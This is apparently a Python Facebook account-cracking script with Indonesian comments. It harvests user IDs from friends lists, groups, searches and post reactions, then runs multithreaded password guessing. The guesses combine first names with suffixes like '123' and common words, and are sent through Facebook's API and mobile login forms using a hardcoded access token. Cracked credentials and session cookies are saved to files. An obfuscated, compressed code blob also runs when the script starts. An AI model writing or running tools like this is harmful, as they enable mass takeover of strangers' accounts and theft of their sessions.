# update sabtu 30 maret 2021
# Mau Ngapain Bro?:v
# Recode? jangan di ganti author nya ajg, dan sertakan sumber!!!:v
# fb me : https://m.facebook.com/Kang.Pacman
import os,sys,re,json,random
from time import sleep as waktu
from shutil import rmtree as hapus
from concurrent.futures import ThreadPoolExecutor as Bool
ok=0
cp=0
die=0
cot=0
live=[]
chek=[]
hitung=""
def restart():repeath=sys.executable ; os.execl(repeath,repeath,*sys.argv)
try:
	import requests as req
except ModuleNotFoundError:
	os.system("python -m pip install requests");restart()
try:
	from bs4 import BeautifulSoup as parser
except ModuleNotFoundError:
	os.system("python -m pip install bs4");restart()
try:hapus("__pycache__")
except:pass
def hasil(ngocok,ismylife):
	if len(ngocok) != 0 or len(ismylife) != 0:
		print(f"\n\n[✓] \x1b[1;35mDone Bro\n\x1b[0m[*] \x1b[1;32mLIVE\x1b[0m/\x1b[1;33mCHEK \x1b[0m: \x1b[1;32m{len(ngocok)}\x1b[0m/\x1b[1;33m{len(ismylife)}\x1b[0m")
		if len(ngocok)==0:pass
		else:print("[*] \x1b[1;32mHasil Live Tersimpan Di File : live.txt\x1b[0m")
		if len(ismylife)==0:pass
		else:print("[*] \x1b[1;33mHasil Chek Tersimpan Di File : chek.txt")
		exit()
	else:exit("\n\n\x1b[1;31m[!] Tidak Mendapatkan Hasil:(")
_=(lambda x:x);code=type(_.__code__);_.__code__=code(0,0,0,0,10,64,b'z*e\x00e\x01d\x00\x83\x01\xa0\x02e\x01d\x01\x83\x01\xa0\x03e\x01d\x02\x83\x01\xa0\x04d\x03\xa1\x01\xa1\x01\xa1\x01\x83\x01\x01\x00W\x00n.\x04\x00e\x05k\nrX\x01\x00Z\x06\x01\x00z\x10e\x07e\x08e\x06\x83\x01\x83\x01\x01\x00W\x005\x00d\x04Z\x06[\x06X\x00Y\x00n\x02X\x00d\x04S\x00',('marshal', 'zlib', 'base64', b'eJxdlkmvq8gVx+337rt938ugzhfIOt1WgplB6m7FYGzANrPNkChXQAFmMvOo7F4+SGeZr+RtVr3OLqv4dlpJFErnd2riVB1VIf5/X/zf86uH/f5h/+AeAAuw/MvCWQTLYJG8+7x03gfvwbufynvwBD6AZ/AFeAEfwSfwM/DzR+3l85fB4vVdsPi8WC7AL/TFx7/90l/+zwLLn4x9WPP0wJ8X+uKrpfS3B+7LsX7/6PoR//w11ADfrQHU+LVbQrkX/jb0oKyIitfX35XT/eWbzM094H73Nvsfb7Hr5wd+eKv98OkNb4k0f3pg/jp4JAEWn5ffv3v45cO/f/hHSt8/gfd/Xb6Vz8vlwlzcfve0CD6kn2pruXCel4v5y+CL4CV4/vzTOL4AT87zH56thb24vbMercfuP9y/yN26ubrZ/WnOYu/+7LlNQGDNH18Wi0AcweXc9RUVaWMH4HnOcEK2eWdLo/VmQKSYLiWhZiI+tfczEym7gxxsjdwF2L6gcwCJW9Hv8W1Y5KgJUJg8Coe+zg7FTS/7quq87ALrLkpAEU+jUL0teCqgdyDfbKBJu6122+vG3ugxEYwUIJs9DSBwIes1T9I7kkpwbKaJI72q6bHvW2yLQOFgqMiIbNCK03AFliMYX628NbkqKbYg6MMWLuitsjFKbh9qvdBv4JG3rBS6HsmNAlHCBcfrbMT9zjXBQNwSiMpQjFVJJ4dC3AlrCgrEm1EFkK+0VLVCYdkyNiLdo11o7emZqBRsUhWq3fP1UCihNqPBlldRJKyZrTY/3lYAtKfRNDR01pCTNaqeOL5TLD9ZsduUSiqFEpSCuVGKsaK1adcL4XaN0UpAxaxxC0nb8Cmo5wnBs46HmjWItRxeTyQ8eVwdnZC6n2mWYzZd0/AmPuYJsVfBJuxY0TArgdes05HziSTm3TTq3NQ2D/mIVc2FrYWV7rVlQulbYaXoQ7Xe0MYw7TODdXcXCz8crnEBTtR6g7IKo0hthjRzbPHCjsyKfYe3ojqr+rbL91dtt3bhw75sc6ZM4bY8p3qTcisjnlvzqB3KxHKmjhdP7aWKkqjNyx236S72BJmz8rhXWSbWjTQ8doXH2YY7t9HuaNIg2910nY5ytrZRpk70sYYtPtnyENu2ZjnYXQdYMTizQpBiQqyfDhIL6NNojL29TyWxlPEaPYsSTR6zNkuHa9RinY9ebWoMx2uti65/3HaO5w3UnJaBiRnDkQErpV0pcyZmYSReekmi9QSvZJKw1MPUbk2HBqh5dJNkVjoULTanapiuipGU+0nIzW50nR3jHS4dJbf4hW9xWjnu0t044RGo9CTdosy4vgKh7Aj32tVrWhgsU4IThM8ro+PMiADw4daRIbezmeiY6qPXJuNh7NYxMfLNuQRx2dQeLJ7ws7pSEGsP59N0dOuzmpkFTCvRWkgDIs+LKo9iBovdFDNN90CAxJYZKdTHrAStyoqycfO2KOwd+HnbaDjS6yuGU+vbyTp6G968cbTLs0yh3ZzM6ZyzP8mQKDtaddwORZ6u03iVG6JXFoXQRUEtgwuqXNISm27VqYr05iyUraofcbbDpyYZdpeCOYpe0Zz1QJnRsUlqJbHTwljBqTzyI8RaGsTnYtKwiVHlpcJy/bhVI29X6KA27XXd6OmaOlaHLL2qWgFu4tU7g1bIqK4QR5+EObKNTafUD8rQMby64Ti7u+gkaVU0NpBYnm/gY0ehZHc51bbMKsI+a1CddI4K610oVZ8QXZIndufcrkeB8G76JSsn+CZEicZX58GJPUc0dgXSsGRthmLHXP02xy63uJzLjDs3met0jLKPq2D2EcgRS8yN5g1i5FMOE/2lAJ7dnGq+NVOc0sgrZSltDKUn1ovy3C7NDh+yabranDLpj49tHNptxW8RJUJsU2LRTkzj85A2odjXdkLrGIC8x1lTbE+fc+Cvs6JCDgG27nPYMRpZw5yDAmutgYQSMJK8dgmMcBschk+FYCCWYiDmuKs4nYyv54QYcyzx+3aIT9sLEelpx+BN0q/XE+5OYaKJQ7va1amsRKrUyodTl6UjM0t6aqfG7MvErfclDFKPtDl1IiwMBCjTvObHY4EiBr9VZQ4J6HGq/AwNrxdkUB17lAKvBQ6JU+XBGGHZ8VbxAcZr3+rg5kxs8pSUT00O8x2RXttdl2exCiOGejQ2qOTuxT3nlhJvK4jHkrBDO6PaUFpnmqd9edJmN12jXK2vuY28jdoK8zW15CRu2jlqfioARqJiZMpKzsMYWsdSgotiudNvvJzw2R7H/XG4OMR+BpRXzbI0Xdm2VlYbfJRq1YZbmE32KRjOGcOOJCevXUlL2p0Ybh+J7Cvdu3BZfb7ShHRGuPpGKwYRs3PM0GnOdFcc0ijzNO4muukQO1OkFa6x4qHF7YvvziZyvGotKaSHnlFELarashr1dDWTliIYnYQmus/4OEf18BCqmzAkVr1tlrfMhHO6hyk/bUi0WnUFI637mcuMC+1bDF4HLUNgvSEHbL8h5jV65uqCxmV/XhMofMlgWqgt6MDzdFRDJL6ajTmPDIpSsv21NaUuICJv7YdCeDMG1FqDG1Ic5xxT6hWNOoKsaXRH11C62lM2sTEJKA6N3UhQolXtrWrXP/7vDEHuhnb49lvpq4/3p2AM/Pun19c4L4u6fX29f8gKFzT3TyDwi7ysg6a5f/QI7K0JgvtHbvSDso2L230Z3D+UdXxr7++btv5Rdc3PhRc+1NX88k1egC4LvvvhTa01b8rq3eLr5ZcL6aun+/L1/tROZXB/eX19C/pY9OnN/1e9/RsfHrj/J9KPOu0t0Mvi0+I3i38BNUlRhw==', None),('exec', '__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'print', 'str'),(),'obf.py','<module>',1,b'\x02\x00*\x01\x10\x00',(),());_()
class ngentod:
	def __init__(self):
		self.url="https://mbasic.facebook.com"
		self.id=[]
	def folower(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\>(.*?)\<\/span\>',kontol) 
			for softek in memek:
				if "&amp;refid=" in softek[0]:
					self.id.append(re.findall("id=(.*?)&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				elif "?refid=" in softek[0]:
					self.id.append(re.findall("(.*?)\?refid=",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
			if "Lihat Selengkapnya" in kontol:
				self.folower(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def babaturan(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
			if "Lihat selengkapnya" in kontol:
				self.babaturan(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def memekgrup(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(softek[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
			if "Lihat Selengkapnya" in kontol:
				self.memekgrup(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def teangan(self,hencet,jum):
		try:
			true=False
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\=\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\/div>',kontol)
			for softek in memek:
				if "profile.php?" in softek[1]:
					self.id.append(re.findall("id=(.*?)&amp;refid",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				elif "?refid=" in softek[1]:
					self.id.append(re.findall("(.*?)\?refid=",softek[1])[0]+"[AapAfandiGanteng]"+softek[2])
				else:
					self.id.append(softek[1]+"[AapAfandiGanteng]"+softek[2])
				print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
				if len(self.id)==jum:
					true=True
					break
			if true==False:
				if "Lihat Hasil Selanjutnya" in kontol:
					self.teangan(parser(kontol,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		except:pass
	def flrencang(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "profile.php?" in softek[0]:
					self.id.append(re.findall("id\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
			if "Lihat Teman Lain" in kontol:
				self.flrencang(self.url+parser(kontol,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
		except:pass
	def menta(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			memek=re.findall('middle\"\>\<a\ class\=\"..\"\ href\=\"(.*?)\"\>(.*?)\<\/a\>',kontol)
			for softek in memek:
				if "?uid" in softek[0]:
					self.id.append(re.findall("uid\=(.*?)\&",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				else:
					self.id.append(re.findall("\/(.*?)\?fref",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
				print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
			if "Lihat selengkapnya" in kontol:
				self.menta(self.url+parser(kontol,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
		except:pass
	def reactpost(self,hencet):
		try:
			kontol=req.get(hencet,cookies=kueh).text
			if "Semua 0" in kontol:
				print("[!] Tidak Ada Yang Menanggapi Postingan, Awokawokawok Kasian Akun Nya Sepi:v");waktu(3);self.menu()
			else:
				memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
				for softek in memek:
					if "profile.php?" in softek[0]:
						self.id.append(re.findall("id=(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					else:
						self.id.append(re.findall("/(.*)",softek[0])[0]+"[AapAfandiGanteng]"+softek[1])
					print(f"\r[*] Mengumpulkan {len(self.id)} Id",end="")
				if "Lihat Selengkapnya" in kontol:
					self.reactpost(self.url+parser(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		except:pass
	def menu(self):
		about().tentang()
		pilih=input("[?] Pilih : ")
		if pilih in["1","01"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=followers"
			else:
				memek=f"{self.url}/{kontol}?v=followers"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Penggunaan Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.folower(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["2","02"]:
			self.babaturan(f"{self.url}/friends/center/friends/")
		elif pilih in["3","03"]:
			while True:
				kontol=input("[?] Masukkan Id Grup : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/browse/group/members/?id={kontol}",cookies=kueh).text
						if "Halaman Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						elif "Konten Tidak Ditemukan" in ajg:
							print(f"[!] Group Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
						else:
							print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
							self.memekgrup(f"{self.url}/browse/group/members/?id={kontol}");break
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["4","04"]:
			while True:
				kontol=input("[?] Nama : ")
				if kontol in[""," "]:
					print("[!] Jangan Kosong Bro")
				else:
					try:
						ajg=req.get(f"{self.url}/search/people/?q={kontol}",cookies=kueh).text
						if "Maaf, kami tidak menemukan" in ajg:
							print(f"[!] Pengguna Dengan Nama {kontol} Tidak Ditemukan");waktu(2);self.menu()
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
							print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
						else:
							jumlah=int(input("[?] Jumlah : "))
							if jumlah < 5001:
								self.teangan(f"{self.url}/search/people/?q={kontol}",jumlah);break
							else: exit("[!] Max 5000 User")
					except req.exceptions.ConnectionError:
						exit("[!] Kesalahan Pada Koneksi")
					except ValueError:
						exit("[!] Isi Yang Bener Ajg")
		elif pilih in["5","05"]:
			kontol=input("[?] Username/Id : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/profile.php?id={kontol}&v=friends"
			else:
				memek=f"{self.url}/{kontol}/friends"
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Tidak Ada Teman Untuk Ditampilkan" in ajg:
					print(f"[!] Daftar Teman Tidak Di Publikasikan");waktu(2);self.menu()
				elif "Halaman yang Anda minta tidak ditemukan." in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				elif "Konten Tidak Ditemukan" in ajg:
					print(f"[!] Pengguna Dengan Id {kontol} Tidak Ditemukan");waktu(2);self.menu()
				else:
					print("[*] Target Name : "+re.findall("\<title\>(.*?)<\/title\>",ajg)[0])
					self.flrencang(memek)
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["6","06"]:
			try:
				ajg=req.get(f"{self.url}/friends/center/requests/#friends_center_main",cookies=kueh).text
				if "Tidak Ada Permintaan" in ajg:
					print("[!] Permintaan Pertemanan Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					self.menta(f"{self.url}/friends/center/requests/#friends_center_main")
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
		elif pilih in["7","07"]:
			kontol=input("[?] Url/Id Postingan : ")
			if kontol in[""," "]:
				print("[!] Jangan Kosong Bro");waktu(1);self.menu()
			elif kontol.isdigit():
				memek=f"{self.url}/{kontol}"
			elif "m.facebook.com" in kontol:
				memek=kontol.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" in kontol:
				memek=kontol.replace("www.facebook.com","mbasic.facebook.com")
			elif "free.facebook.com" in kontol:
				memek=kontol.replace("free.facebook.com","mbasic.facebook.com")
			else:
				memek=kontol
			try:
				ajg=req.get(memek,cookies=kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." in ajg:
					print(f"[!] Posting Tidak Ditemukan");waktu(2);self.menu()
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
					print("[!] Facebook Membatasi Setiap Aktivitas, Limit Bro, Silahkan Beralih Akun");waktu(2);self.menu()
				else:
					try:
						kuntul=re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',ajg)[0]
						self.reactpost(f"{self.url}/ufi/reaction/profile/browser/{kuntul}")
					except IndexError:
						print("[!] Error, Silahkan Masukkan Id/Url Postingan Dengan Benar");waktu(1);self.menu()
			except req.exceptions.ConnectionError:
				exit("[!] Kesalahan Pada Koneksi")
			except req.exceptions.MissingSchema:
				print(f"[!] Why {memek} Mikir Dong Tolol, Masukin Url Postingan Yang Bener Ngentod");waktu(3);self.menu()
		elif pilih in["8","08"]:
			tod=open("live.txt").read()
			tOd=open("chek.txt").read()
			if len(tod)==0 or "|" not in tod:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Live")
			else:
				print("\n\x1b[1;32m[Result Live]\n")
				print(tod)
			if len(tOd)==0 or "|" not in tOd:
				print("\x1b[1;31m[!] Tidak Ditemukan Hasil Chek")
			else:
				print("\n\x1b[1;33m[Result Check]\n")
				print(tOd)
			exit()
		elif pilih=="98":
			print("[*] Silahkan Hubungi WhatsApp Saya 083805812588");os.system("xdg-open http://wa.me/+6283805812588?text=assalamualaikum");input("[*] Enter Untuk Kembali Ke Menu > ");waktu(2);self.menu()
		elif pilih=="99":
			try:os.remove("cookie")
			except:os.system("rm cookie")
			exit()
		elif pilih in["0","00"]:
			exit("[*] Thank You For Using My Tool")
		elif pilih in[""," "]:
			print("[!] Jangan Kosong Bro");waktu(0.8);self.menu()
		else:
			print("[!] Pilihan Tidak Ada");self.menu()
		if len(self.id)!=0:
			print("")
			self.askk()
		else:
			print("[!] Gagal Mengambil ID, Silahkan Coba Lagi");waktu(1.5);self.menu()
	def askk(self):
		njir=input("[?] Ingin Menggunakan Password Manual Y/T : ")
		if njir in(""," "):
			print("[!] Jangan Kosong Bro");self.askk()
		elif njir in("y","Y"):
			print("[*] Contoh : name123,name12345")
			while True:
				pwek=input("[?] Password : ")
				if pwek in(""," "):
					print("[!] Jangan Kosong Bro")
				elif len(pwek)<=5:
					print("[!] Password Minimal 6 Karakter")
				else:
					def xhh(xss=None):
						pilih=input("[?] Pilih : ")
						if pilih in(""," "):
							print("[!] Jangan Kosong Bro");xhh()
						elif pilih in("1","01"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										for pwas in xss:
											tokai.submit(self.crackapi,xi,pwas)
									except: pass
							hasil(live,chek)
						elif pilih in("2","02"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										for pwas in xss:
											tokai.submit(self.__Njir__,xi,pwas,"https://mbasic.facebook.com")
									except: pass
							hasil(live,chek)
						elif pilih in("3","03"):
							print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
							with Bool(max_workers=30) as tokai:
								for xa in self.id:
									try:
										xi=xa.split("[AapAfandiGanteng]")[0]
										for pwas in xss:
											tokai.submit(self.__Njir__,xi,pwas,"https://m.facebook.com")
									except: pass
							hasil(live,chek)
						else:
							print("[!] Isi Yang Bener Ajg");xhh()
					print("  -=[ Pilih Metode Crack ]=-")
					print("[1] Metode b-api (Mode Crack Cepat)")
					print("[2] Metode mbasic (Mode Crack Lambat)")
					print("[3] Metode m.facebook (Mode Crack Lambat)")
					xhh(pwek.split(","))
					break
		elif njir in("t","T"):
			print("  -=[ Pilih Metode Crack ]=-")
			print("[1] Metode b-api (Mode Crack Cepat)")
			print("[2] Metode mbasic (Mode Crack Lambat)")
			print("[3] Metode m.facebook (Mode Crack Lambat)")
			self.ngontol()
		else:
			print("[!] Isi Yang Bener Ajg");self.askk()
	def crackapi(self,user,pw):
		global ok,cp,die,cot,hitung
		if hitung!=user:
			hitung=user
			cot+=1
		ses=req.Session()
		api="https://b-api.facebook.com/method/auth.login"
		param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
		send=ses.get(api,params=param)
		if "session_key" in send.text and "EAAA" in send.text:
			ok+=1
			print(f"\r\x1b[1;32m * ---> {user}|{pw}\x1b[0m\n",end="")
			open("live.txt","a").write(f"{user}|{pw}\n")
			live.append(f"{user}{pw}")
		elif "www.facebook.com" in send.json()["error_msg"]:
			cp+=1
			print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
			open("chek.txt","a").write(f"{user}|{pw}\n")
			chek.append(f"{user}{pw}")
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def __Njir__(self,user,pw,_anjay):
		global ok,cp,die,cot,hitung
		if hitung!=user:
			hitung=user
			cot+=1
		data={}
		ses=req.Session()
		ses.headers.update({"Host":re.findall("//(.+)",_anjay)[0],"cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","referer":f"{_anjay}/login/?next&ref=dbl&fl&refid=8","origin":_anjay,"accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		kontol=ses.get(f"{_anjay}/login/?next&ref=dbl&refid=8")
		ses.cookies.update({"cookie":";".join([f"{key}={value}" for key,value in kontol.cookies.get_dict().items()])})
		for x in parser(kontol.text,"html.parser")("input"):
			if x.get("value") is not None: data.update({x.get("name"):x.get("value")})
			else: data.update({x.get("name"):""})
		data.update({"email":user,"pass":pw,"prefill_contact_point":"","prefill_source":"","prefill_type":"","first_prefill_source":"","first_prefill_type":"","had_cp_prefilled":"false","had_password_prefilled":"false","is_smart_lock":"false","_fb_noscript":"true","bi_xrwh":"0"})
		if "mbasic.facebook.com" in _anjay:
			tod_="https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8"
		else:
			tod_="https://m.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100"
		memek=ses.post(tod_,data=data)
		if "c_user" in memek.cookies:
			ok+=1
			kuki=";".join([f"{key}={value}" for key,value in memek.cookies.get_dict().items()])
			print(f"\r\x1b[1;32m * ---> {user}|{pw}|{kuki}\x1b[0m\n",end="")
			open("live.txt","a").write(f"{user}|{pw}|{kuki}\n")
			live.append(f"{user}{pw}{kuki}")
		elif "checkpoint" in memek.cookies:
			cp+=1
			print(f"\r\x1b[1;33m * ---> {user}|{pw}\x1b[0m\n",end="")
			open("chek.txt","a").write(f"{user}|{pw}\n")
			chek.append(f"{user}{pw}")
		print(f"\r[CRACK] {str(cot)}/{len(self.id)} OK:-{str(ok)} CP:-{str(cp)}",end="")
	def ngontol(self):
		nanya=input("[?] Pilih : ")
		if nanya in[""," "]:
			print("[!] Jangan Kosong Bro");self.ngontol()
		elif nanya in["1","01"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=30) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Sayang","Kontol","Bangsat","Anjing"]
						for pwas in pewe:
							tokai.submit(self.crackapi,xi[0],pwas)
					except:pass
			hasil(live,chek)
		elif nanya in["2","02"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=random.choice([30,50])) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Sayang","Kontol","Bangsat","Anjing"]
						for pwas in pewe:
							tokai.submit(self.__Njir__,xi[0],pwas,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif nanya in["3","03"]:
			print("[*] Starting Crack..\n[*] Hasil LIVE Tersimpan Di File : live.txt\n[*] Hasil CHEK Tersimpan Di File : chek.txt\n[!] Tekan CTRL + Z Untuk Berhenti\n")
			with Bool(max_workers=random.choice([30,50])) as tokai:
				for xa in self.id:
					try:
						xi=xa.split("[AapAfandiGanteng]")
						xe=xi[1].split(" ")
						if len(xe)==1 or len(xe)==2 or len(xe)==3 or len(xe)==4 or len(xe)==5:
							if len(xe[0])<=5:
								pewe=[xe[0]+"123",xe[0]+"12345","Sayang","Kontol","Bangsat","Anjing"]
							else:
								pewe=[xe[0],xe[0]+"123",xe[0]+"12345","Sayang","Kontol","Bangsat","Anjing"]
						else:
							pewe=["Sayang","Kontol","Bangsat","Anjing"]
						for pwas in pewe:
							tokai.submit(self.__Njir__,xi[0],pwas,"https://m.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print("[!] Isi Yang Bener Ajg");self.ngontol()
